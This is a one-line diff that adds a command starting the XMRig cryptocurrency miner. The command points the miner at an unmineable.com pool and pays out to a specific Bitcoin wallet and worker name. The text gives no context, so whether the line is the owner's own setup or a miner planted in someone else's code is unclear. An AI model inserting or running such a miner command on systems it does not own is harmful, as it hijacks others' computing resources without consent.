@@ -1,0 +1,1 @@
+./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qnxeen4sktk70mg3ne4vgx3pkl57kdlq2r0cfcd.unmineable_worker_jlanafql -p x 
